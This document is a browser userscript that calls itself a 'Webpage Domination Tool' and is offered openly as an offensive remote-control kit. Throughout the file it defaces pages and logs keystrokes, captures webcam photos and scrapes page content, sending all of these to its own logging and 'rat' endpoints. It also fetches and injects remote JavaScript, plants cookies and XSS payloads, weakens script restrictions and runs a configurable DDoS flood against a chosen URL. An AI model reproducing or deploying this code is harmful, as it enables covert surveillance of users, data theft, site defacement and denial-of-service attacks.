// ==UserScript==
// @name Noodles - Webpage Domination Tool 💥💀💻💣🔥⚠
// @namespace http://noodles.local/
// @version 1.337.75
// @description Own any webpage. Deface, redirect, inject. Advanced config, remote control.
// @author TheBlackHatNoRemorse | Edited By Noodles Automatic - Enhanced by yours truly
// @match *://*/*
// @grant GM_setValue
// @grant GM_getValue
// @grant GM_addStyle
// @grant GM_deleteValue
// @grant GM_registerMenuCommand
// @grant GM_xmlhttpRequest
// @grant GM_openInTab
// @run-at document-start
// @connect ipinfo.io
// @connect noodles.local
// @require https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuidv4.min.js
// ==/UserScript==

(function() {
    'use strict';

    const storageKeyPrefix = 'noodles_defacement_';
    const logServerURL = '/main/logs';
    const ratServerURL = '/main/rat';
    const heartbeatInterval = 60000;
    let sessionID = GM_getValue(storageKeyPrefix + 'sessionID', null);

    if (!sessionID) {
        sessionID = uuidv4();
        GM_setValue(storageKeyPrefix + 'sessionID', sessionID);
    }

    const getConfig = () => {
        return {
            title: GM_getValue(storageKeyPrefix + 'title', 'Owned by Noodles!'),
            message: GM_getValue(storageKeyPrefix + 'message', 'This site is ours now.'),
            bgColor: GM_getValue(storageKeyPrefix + 'bgColor', '#000000'),
            textColor: GM_getValue(storageKeyPrefix + 'textColor', '#00ff00'),
            font: GM_getValue(storageKeyPrefix + 'font', 'monospace'),
            fontSize: GM_getValue(storageKeyPrefix + 'fontSize', '32px'),
            redirectURL: GM_getValue(storageKeyPrefix + 'redirectURL', ''),
            imageURL: GM_getValue(storageKeyPrefix + 'imageURL', ''),
            customCSS: GM_getValue(storageKeyPrefix + 'customCSS', ''),
            enableAnimation: GM_getValue(storageKeyPrefix + 'enableAnimation', true),
            jsInjection: GM_getValue(storageKeyPrefix + 'jsInjection', ''),
            elementRemoval: GM_getValue(storageKeyPrefix + 'elementRemoval', ''),
            cookies: JSON.parse(GM_getValue(storageKeyPrefix + 'cookies', '[]')),
            xssPayload: GM_getValue(storageKeyPrefix + 'xssPayload', '<script>alert("XSS by Noodles");</script>'),
            keyloggerEnabled: GM_getValue(storageKeyPrefix + 'keyloggerEnabled', false),
            geoDataEnabled: GM_getValue(storageKeyPrefix + 'geoDataEnabled', false),
            webcamEnabled: GM_getValue(storageKeyPrefix + 'webcamEnabled', false),
            remoteJSEnabled: GM_getValue(storageKeyPrefix + 'remoteJSEnabled', false),
            domExfilEnabled: GM_getValue(storageKeyPrefix + 'domExfilEnabled', false),
            domExfilSelectors: GM_getValue(storageKeyPrefix + 'domExfilSelectors', 'body'),
            beaconInterval: GM_getValue(storageKeyPrefix + 'beaconInterval', 300000),
            panelVisible: GM_getValue(storageKeyPrefix + 'panelVisible', true),
            ddosEnabled: GM_getValue(storageKeyPrefix + 'ddosEnabled', false),
            ddosTarget: GM_getValue(storageKeyPrefix + 'ddosTarget', ''),
            ddosThreads: GM_getValue(storageKeyPrefix + 'ddosThreads', 10),
            ddosRate: GM_getValue(storageKeyPrefix + 'ddosRate', 100),
            ddosRandomStringLength: GM_getValue(storageKeyPrefix + 'ddosRandomStringLength', 50),
            scriptBypass: GM_getValue(storageKeyPrefix + 'scriptBypass', false)
        };
    };

    let defacementConfig = getConfig();

    const applyDefacement = () => {
        try {
            if (defacementConfig.scriptBypass) {
                 const meta = document.createElement('meta');
                 meta.httpEquiv = "Content-Security-Policy";
                 meta.content = "script-src 'self' 'unsafe-inline' 'unsafe-eval';";
                 document.head.appendChild(meta);
            }

            document.title = defacementConfig.title;
            document.documentElement.innerHTML = '';
            document.body = document.createElement('body');

            const styles = `
                body {
                    background-color: ${defacementConfig.bgColor} !important;
                    color: ${defacementConfig.textColor} !important;
                    font-family: ${defacementConfig.font} !important;
                    font-size: ${defacementConfig.fontSize} !important;
                    text-align: center !important;
                    padding: 50px !important;
                }
                img {
                    max-width: 500px !important;
                    max-height: 500px !important;
                }
                ${defacementConfig.enableAnimation ? `
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                body {
                    animation: fadeIn 2s;
                }
                ` : ''}
                ${defacementConfig.customCSS}
            `;

            GM_addStyle(styles);

            const messageElement = document.createElement('div');
            messageElement.textContent = defacementConfig.message;
            document.body.appendChild(messageElement);

            if (defacementConfig.imageURL) {
                const imageElement = document.createElement('img');
                imageElement.src = defacementConfig.imageURL;
                document.body.appendChild(imageElement);
            }

            if (defacementConfig.redirectURL) {
                window.location.href = defacementConfig.redirectURL;
            }

            if (defacementConfig.jsInjection) {
                try {
                    const script = document.createElement('script');
                    script.innerHTML = defacementConfig.jsInjection;
                    document.body.appendChild(script);
                } catch (e) {
                    console.error('Noodles: JS Injection Failed:', e);
                    logError('JS Injection Failed: ' + e.message);
                }
            }

            if (defacementConfig.elementRemoval) {
                try {
                    const elements = document.querySelectorAll(defacementConfig.elementRemoval);
                    elements.forEach(el => el.remove());
                } catch (e) {
                    console.error('Noodles: Element Removal Failed:', e);
                    logError('Element Removal Failed: ' + e.message);
                }
            }

            try{
                defacementConfig.cookies.forEach(cookie => {
                    let cookieString = `${cookie.name}=${cookie.value};domain=${cookie.domain || document.domain};path=${cookie.path || '/'}`;
                    if(cookie.secure) cookieString += ';secure';
                    if(cookie.httpOnly) cookieString += ';httpOnly';
                    document.cookie = cookieString;
                });
            } catch (e) {
                console.error('Noodles: Cookie setting failed:', e);
                logError('Cookie setting failed: ' + e.message);
            }


            //Attempt XSS
            try {
                const xssDiv = document.createElement('div');
                xssDiv.innerHTML = defacementConfig.xssPayload;
                document.body.appendChild(xssDiv);
            } catch (e) {
                console.error('Noodles: XSS Failed:', e);
                logError('XSS Failed: ' + e.message);
            }
        } catch (e) {
            console.error("Noodles: Apply Defacement failed:", e);
            logError('Apply Defacement failed: ' + e.message);
        }
    };

    const logKeypress = (event) => {
        if (!defacementConfig.keyloggerEnabled) return;
        try {
            const keyData = {
                sessionID: sessionID,
                key: event.key,
                code: event.code,
                location: window.location.href,
                timestamp: Date.now()
            };

            GM_xmlhttpRequest({
                method: 'POST',
                url: logServerURL + '/keys',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: JSON.stringify(keyData),
                onload: (response) => {
                    if (response.status !== 200) {
                        console.error('Noodles: Keylog failed to send:', response.status, response.responseText);
                    }
                },
                onerror: (error) => {
                    console.error('Noodles: Keylog send error:', error);
                }
            });
        } catch (e) {
            console.error("Noodles: Keypress logging failed:", e);
            logError('Keypress logging failed: ' + e.message);
        }
    };

    const logError = (message) => {
        try {
            const errorData = {
                sessionID: sessionID,
                message: message,
                location: window.location.href,
                timestamp: Date.now()
            };

            GM_xmlhttpRequest({
                method: 'POST',
                url: logServerURL + '/errors',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: JSON.stringify(errorData),
                onload: (response) => {
                    if (response.status !== 200) {
                        console.error('Noodles: Log failed to send:', response.status, response.responseText);
                    }
                },
                onerror: (error) => {
                    console.error('Noodles: Log send error:', error);
                }
            });
        } catch (e) {
            console.error("Noodles: Error logging failed:", e);
        }
    }

    const sendHeartbeat = () => {
        try {
            const heartbeatData = {
                sessionID: sessionID,
                location: window.location.href,
                timestamp: Date.now()
            };

            GM_xmlhttpRequest({
                method: 'POST',
                url: ratServerURL + '/heartbeat',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: JSON.stringify(heartbeatData),
                onload: (response) => {
                    if (response.status !== 200) {
                        console.error('Noodles: Heartbeat failed to send:', response.status, response.responseText);
                    }
                },
                onerror: (error) => {
                    console.error('Noodles: Heartbeat send error:', error);
                }
            });
        } catch (e) {
            console.error("Noodles: Heartbeat failed:", e);
        }
    };

    const getGeoLocation = () => {
        if (!defacementConfig.geoDataEnabled) return;

        try {
            GM_xmlhttpRequest({
                method: 'GET',
                url: 'https://ipinfo.io/json',
                onload: (response) => {
                    if (response.status === 200) {
                        try {
                            const geoData = JSON.parse(response.responseText);
                            geoData.sessionID = sessionID;
                            GM_xmlhttpRequest({
                                method: 'POST',
                                url: ratServerURL + '/geo',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                data: JSON.stringify(geoData),
                                onload: (response) => {
                                    if (response.status !== 200) {
                                        console.error('Noodles: Geo data failed to send:', response.status, response.responseText);
                                    }
                                },
                                onerror: (error) => {
                                    console.error('Noodles: Geo data send error:', error);
                                }
                            });

                        } catch (e) {
                            console.error('Noodles: Geo data parse error:', e);
                            logError('Geo data parse error: ' + e.message);
                        }
                    } else {
                        console.error('Noodles: Geo data fetch error:', response.status, response.responseText);
                        logError('Geo data fetch error: ' + response.status + ' ' + response.responseText);
                    }
                },
                onerror: (error) => {
                    console.error('Noodles: Geo data request error:', error);
                    logError('Geo data request error: ' + error.message);
                }
            });
        } catch (e) {
            console.error("Noodles: GeoLocation failed:", e);
            logError('GeoLocation failed: ' + e.message);
        }
    };

    const getWebcamAccess = () => {
        if (!defacementConfig.webcamEnabled) return;

        try {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const videoTrack = stream.getVideoTracks()[0];
                    const imageCapture = new ImageCapture(videoTrack);

                    return imageCapture.takePhoto();
                })
                .then(blob => {
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        const base64data = reader.result;
                        const webcamData = {
                            sessionID: sessionID,
                            image: base64data,
                            location: window.location.href,
                            timestamp: Date.now()
                        };

                        GM_xmlhttpRequest({
                            method: 'POST',
                            url: ratServerURL + '/webcam',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            data: JSON.stringify(webcamData),
                            onload: (response) => {
                                if (response.status !== 200) {
                                    console.error('Noodles: Webcam data failed to send:', response.status, response.responseText);
                                }
                            },
                            onerror: (error) => {
                                console.error('Noodles: Webcam data send error:', error);
                            }
                        });
                    };
                    reader.readAsDataURL(blob);
                })
                .catch(error => {
                    console.error('Noodles: Webcam access error:', error);
                    logError('Webcam access error: ' + error.message);
                });
        } catch (e) {
            console.error("Noodles: Webcam failed:", e);
            logError('Webcam failed: ' + e.message);
        }
    };

    const fetchAndInjectRemoteJS = () => {
        if (!defacementConfig.remoteJSEnabled) return;
        try {
            GM_xmlhttpRequest({
                method: 'GET',
                url: ratServerURL + '/remote.js?session=' + sessionID,
                onload: (response) => {
                    if (response.status === 200) {
                        try {
                            const script = document.createElement('script');
                            script.innerHTML = response.responseText;
                            document.body.appendChild(script);
                        } catch (e) {
                            console.error('Noodles: Remote JS Injection Failed:', e);
                            logError('Remote JS Injection Failed: ' + e.message);
                        }
                    } else {
                        console.error('Noodles: Remote JS Fetch Failed:', response.status, response.responseText);
                        logError('Remote JS Fetch Failed: ' + response.status + ' ' + response.responseText);
                    }
                },
                onerror: (error) => {
                    console.error('Noodles: Remote JS Request Error:', error);
                    logError('Remote JS Request Error: ' + error.message);
                }
            });
        } catch (e) {
            console.error("Noodles: RemoteJS failed:", e);
            logError('RemoteJS failed: ' + e.message);
        }
    };

    const exfiltrateDOM = () => {
        if (!defacementConfig.domExfilEnabled) return;

        try {
            const extractedData = {};
            const selectors = defacementConfig.domExfilSelectors.split(',').map(s => s.trim());

            selectors.forEach(selector => {
                const elements = document.querySelectorAll(selector);
                const elementData = [];

                elements.forEach(el => {
                    elementData.push({
                        tagName: el.tagName,
                        textContent: el.textContent,
                        attributes: Array.from(el.attributes).map(attr => ({ name: attr.name, value: attr.value }))
                    });
                });

                extractedData[selector] = elementData;
            });

            const domExfilData = {
                sessionID: sessionID,
                location: window.location.href,
                timestamp: Date.now(),
                data: extractedData
            };

            GM_xmlhttpRequest({
                method: 'POST',
                url: ratServerURL + '/dom',
                headers: {
                    'Content-Type': 'application/json'
                },
                data: JSON.stringify(domExfilData),
                onload: (response) => {
                    if (response.status !== 200) {
                        console.error('Noodles: DOM Exfiltration Failed:', response.status, response.responseText);
                    }
                },
                onerror: (error) => {
                    console.error('Noodles: DOM Exfiltration Error:', error);
                }
            });

        } catch (e) {
            console.error('Noodles: DOM Exfiltration Setup Failed:', e);
            logError('DOM Exfiltration Setup Failed: ' + e.message);
        }
    };

   const performDDOS = () => {
        if (!defacementConfig.ddosEnabled || !defacementConfig.ddosTarget) return;

        const targetURL = defacementConfig.ddosTarget;
        const numThreads = defacementConfig.ddosThreads;
        const requestsPerSecond = defacementConfig.ddosRate;
        const randomStringLength = defacementConfig.ddosRandomStringLength;
        let ddosIntervals = [];

        const generateRandomString = (length) => {
            let result = '';
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            const charactersLength = characters.length;
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }
            return result;
        };

        const attack = async () => {
            try {
                const randomString = generateRandomString(randomStringLength);
                const payload = { data: randomString };

                await fetch(targetURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(payload),
                    keepalive: true
                })
                .catch(error => {
                   console.debug("DDoS Request Failed (no-cors)", error);
                });

            } catch (e) {
                console.error('Noodles: DDoS Failed:', e);
                logError('DDoS Failed: ' + e.message);
            }
        };


        const startDDoS = () => {
             stopDDoS();

             for (let i = 0; i < numThreads; i++) {
                let intervalId = setInterval(attack, 1000 / requestsPerSecond);
                ddosIntervals.push(intervalId);
            }
        }

        const stopDDoS = () => {
            ddosIntervals.forEach(intervalId => clearInterval(intervalId));
            ddosIntervals = [];
        }

        if (defacementConfig.ddosEnabled) {
            startDDoS();
        }


       return { startDDoS, stopDDoS };
    };

   let ddosControl = performDDOS();


    const createConfigPanel = () => {
        let panel = document.getElementById('noodlesDefacementPanel');
        if (panel) {
            panel.remove();
        }

        panel = document.createElement('div');
        panel.id = 'noodlesDefacementPanel';
        panel.style.cssText = `position:fixed;top:0;left:0;background:rgba(30,30,30,0.9);color:#ddd;padding:10px;z-index:10000;font-family: monospace; font-size: 14px; border: 1px solid #555; box-shadow: 2px 2px 5px rgba(0,0,0,0.5);`;

        if (!defacementConfig.panelVisible) {
            panel.style.display = 'none';
        }

        const createInput = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
            lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const input = document.createElement('input');
            input.type = 'text';
            input.value = defacementConfig[key];
            input.style.width = '300px';
            input.style.backgroundColor = '#444';
            input.style.color = '#ddd';
            input.style.border = '1px solid #777';
            input.addEventListener('change', (e) => {
                GM_setValue(storageKeyPrefix + key, e.target.value);
                defacementConfig = getConfig();
            });
            div.appendChild(lbl);
            div.appendChild(input);
            return div;
        };

        const createTextArea = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const textarea = document.createElement('textarea');
            textarea.value = defacementConfig[key];
            textarea.style.width = '300px';
            textarea.style.height = '100px';
            textarea.style.backgroundColor = '#444';
            textarea.style.color = '#ddd';
            textarea.style.border = '1px solid #777';
            textarea.addEventListener('change', (e) => {
                GM_setValue(storageKeyPrefix + key, e.target.value);
                defacementConfig = getConfig();
            });
            div.appendChild(lbl);
            div.appendChild(textarea);
            return div;
        };

        const createCheckbox = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            checkbox.checked = defacementConfig[key];
            checkbox.addEventListener('change', (e) => {
                GM_setValue(storageKeyPrefix + key, e.target.checked);
                defacementConfig = getConfig();
                if (key === 'keyloggerEnabled') {
                    if (e.target.checked) {
                        document.addEventListener('keypress', logKeypress);
                    } else {
                        document.removeEventListener('keypress', logKeypress);
                    }
                }
                 if (key === 'ddosEnabled') {
                     ddosControl = performDDOS();

                    if (e.target.checked) {
                        ddosControl.startDDoS();
                    } else {
                        ddosControl.stopDDoS();
                    }
                }
            });
            div.appendChild(lbl);
            div.appendChild(checkbox);
            return div;
        };

       const createCookieEditor = () => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = 'Cookies:';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            div.appendChild(lbl);

            const cookieList = document.createElement('div');
            cookieList.id = 'noodlesCookieList';
            cookieList.style.marginBottom = '5px';
            div.appendChild(cookieList);

            const refreshCookieList = () => {
                cookieList.innerHTML = '';
                defacementConfig.cookies.forEach((cookie, index) => {
                    const cookieDiv = document.createElement('div');
                    cookieDiv.style.marginBottom = '2px';
                    cookieDiv.style.padding = '5px';
                    cookieDiv.style.border = '1px solid #777';
                    cookieDiv.style.backgroundColor = '#333';

                    const cookieLabel = document.createElement('span');
                    cookieLabel.textContent = `${cookie.name}=${cookie.value}`;
                    cookieLabel.style.marginRight = '10px';
                    cookieDiv.appendChild(cookieLabel);

                    const deleteButton = document.createElement('button');
                    deleteButton.textContent = 'Delete';
                    deleteButton.style.backgroundColor = '#800';
                    deleteButton.style.color = '#ddd';
                    deleteButton.style.border = 'none';
                    deleteButton.style.cursor = 'pointer';
                    deleteButton.addEventListener('click', () => {
                        defacementConfig.cookies.splice(index, 1);
                        GM_setValue(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                        defacementConfig = getConfig();
                        refreshCookieList();
                    });
                    cookieDiv.appendChild(deleteButton);
                    cookieList.appendChild(cookieDiv);
                });
            };

            refreshCookieList();

            const addCookieButton = document.createElement('button');
            addCookieButton.textContent = 'Add Cookie';
            addCookieButton.style.backgroundColor = '#444';
            addCookieButton.style.color = '#ddd';
            addCookieButton.style.border = 'none';
            addCookieButton.style.cursor = 'pointer';
            addCookieButton.addEventListener('click', () => {
                const newCookie = { name: 'newCookie', value: 'newValue', domain: document.domain, path: '/', secure: false, httpOnly: false };
                defacementConfig.cookies.push(newCookie);
                GM_setValue(storageKeyPrefix + 'cookies', JSON.stringify(defacementConfig.cookies));
                defacementConfig = getConfig();
                refreshCookieList();
            });
            div.appendChild(addCookieButton);

            return div;
        };

        const createNumberInput = (label, key) => {
            const div = document.createElement('div');
            div.style.marginBottom = '5px';
            const lbl = document.createElement('label');
            lbl.textContent = label + ': ';
            lbl.style.marginRight = '5px';
             lbl.style.display = 'inline-block';
            lbl.style.width = '150px';
            const input = document.createElement('input');
            input.type = 'number';
            input.value = defacementConfig[key];
            input.style.width = '300px';
            input.style.backgroundColor = '#444';
            input.style.color = '#ddd';
            input.style.border = '1px solid #777';
            input.addEventListener('change', (e) => {
                const parsedValue = parseInt(e.target.value, 10);
                if (!isNaN(parsedValue)) {
                    GM_setValue(storageKeyPrefix + key, parsedValue);
                    defacementConfig = getConfig();
                }
            });
            div.appendChild(lbl);
            div.appendChild(input);
            return div;
        };

        const refreshButton = document.createElement('button');
        refreshButton.textContent = 'Apply Defacement';
        refreshButton.style.cssText = 'margin-top: 10px; padding: 5px 10px; background: #555; color: #ddd; border: none; cursor: pointer;';
        refreshButton.addEventListener('click', applyDefacement);

        const resetButton = document.createElement('button');
        resetButton.textContent = 'Reset All';
        resetButton.style.cssText = 'margin-top: 10px; margin-left: 10px; padding: 5px 10px; background: #800; color: #ddd; border: none; cursor: pointer;';
        resetButton.addEventListener('click', () => {
            if (confirm('Are you sure you want to reset all settings?')) {
              for (const key in defacementConfig) {
                  GM_deleteValue(storageKeyPrefix + key);
              }
              defacementConfig = getConfig();
              applyDefacement();
              panel.remove();
              createConfigPanel();
            }
        });

        const togglePanelButton = document.createElement('button');
        togglePanelButton.textContent = defacementConfig.panelVisible ? 'Hide Panel' : 'Show Panel';
        togglePanelButton.style.cssText = 'margin-top: 10px; margin-left: 10px; padding: 5px 10px; background: #555; color: #ddd; border: none; cursor: pointer;';
        togglePanelButton.addEventListener('click', () => {
            defacementConfig.panelVisible = !defacementConfig.panelVisible;
            GM_setValue(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
            panel.style.display = defacementConfig.panelVisible ? 'block' : 'none';
            togglePanelButton.textContent = defacementConfig.panelVisible ? 'Hide Panel' : 'Show Panel';
        });

        panel.appendChild(createInput('Title', 'title'));
        panel.appendChild(createInput('Message', 'message'));
        panel.appendChild(createInput('Background Color', 'bgColor'));
        panel.appendChild(createInput('Text Color', 'textColor'));
        panel.appendChild(createInput('Font', 'font'));
        panel.appendChild(createInput('Font Size', 'fontSize'));
        panel.appendChild(createInput('Redirect URL', 'redirectURL'));
        panel.appendChild(createInput('Image URL', 'imageURL'));
        panel.appendChild(createTextArea('Custom CSS', 'customCSS'));
        panel.appendChild(createTextArea('JS Injection', 'jsInjection'));
        panel.appendChild(createInput('Element Removal (querySelector)', 'elementRemoval'));
        panel.appendChild(createTextArea('XSS Payload', 'xssPayload'));
        panel.appendChild(createInput('DOM Exfil Selectors (comma-separated)', 'domExfilSelectors'));
        panel.appendChild(createCheckbox('Enable Animation', 'enableAnimation'));
        panel.appendChild(createCheckbox('Enable Keylogger', 'keyloggerEnabled'));
        panel.appendChild(createCheckbox('Enable Geo Data', 'geoDataEnabled'));
        panel.appendChild(createCheckbox('Enable Webcam', 'webcamEnabled'));
        panel.appendChild(createCheckbox('Enable Remote JS', 'remoteJSEnabled'));
        panel.appendChild(createCheckbox('Enable DOM Exfil', 'domExfilEnabled'));
        panel.appendChild(createCookieEditor());
        panel.appendChild(createNumberInput('Beacon Interval (ms)', 'beaconInterval'));
        panel.appendChild(createCheckbox('Enable DDoS', 'ddosEnabled'));
        panel.appendChild(createInput('DDoS Target URL', 'ddosTarget'));
        panel.appendChild(createNumberInput('DDoS Threads', 'ddosThreads'));
        panel.appendChild(createNumberInput('DDoS Rate (Requests/sec)', 'ddosRate'));
        panel.appendChild(createNumberInput('DDoS Random String Length', 'ddosRandomStringLength'));
        panel.appendChild(createCheckbox('Bypass Script Restrictions', 'scriptBypass'));

        panel.appendChild(refreshButton);
        panel.appendChild(resetButton);
        panel.appendChild(togglePanelButton);

        document.body.appendChild(panel);

         const dragPanel = (elmnt) => {
            let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
            const dragMouseDown = (e) => {
                e = e || window.event;
                e.preventDefault();
                pos3 = e.clientX;
                pos4 = e.clientY;
                document.onmouseup = closeDragElement;
                document.onmousemove = elementDrag;
            }

            const elementDrag = (e) => {
                e = e || window.event;
                e.preventDefault();
                pos1 = pos3 - e.clientX;
                pos2 = pos4 - e.clientY;
                pos3 = e.clientX;
                pos4 = e.clientY;
                elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
                elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
            }

            const closeDragElement = () => {
                document.onmouseup = null;
                document.onmousemove = null;
            }

            panel.onmousedown = dragMouseDown;
        }

        dragPanel(panel);
    };

    GM_registerMenuCommand("Noodles: Toggle Defacement Panel", () => {
        defacementConfig.panelVisible = !defacementConfig.panelVisible;
        GM_setValue(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
        createConfigPanel();
    });

    setInterval(sendHeartbeat, heartbeatInterval);
    setInterval(getWebcamAccess, 120000);
    setInterval(fetchAndInjectRemoteJS, 90000);
    setInterval(exfiltrateDOM, defacementConfig.beaconInterval);

    getGeoLocation();

    const initialize = () => {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                createConfigPanel();
                applyDefacement();
            });
        } else {
            createConfigPanel();
            applyDefacement();
        }
    };

  const initializeKeylogger = () => {
        if (defacementConfig.keyloggerEnabled) {
            document.addEventListener('keypress', logKeypress);
        }
    };


    initialize();
    initializeKeylogger();

})();